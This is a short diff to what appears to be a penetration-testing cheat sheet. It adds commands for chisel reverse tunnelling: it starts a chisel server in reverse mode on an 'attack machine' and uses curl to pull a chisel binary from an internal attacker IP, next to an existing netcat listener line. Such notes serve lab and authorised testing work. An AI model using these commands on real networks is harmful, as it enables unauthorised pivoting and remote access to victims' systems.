@@ -654,7 +654,18 @@ nc -lvnp 4444
 
 Download appropriate binaries from the tool's [Github release page](https://github.com/jpillora/chisel/releases). These can then be unzipped using `gunzip`, and executed as normal.
 
+Attack Machine:
+```
+./chisel server -p LISTEN_PORT --reverse &
 ```
 
 ```
+curl 10.50.106.240/chisel_1.9.1_linux_amd64  -o chisel-sardarji
+```
+
+```
+Attacker
+./chisel_1.9.1_linux_amd64 server -p 1337 --reverse & 
+```
+
 
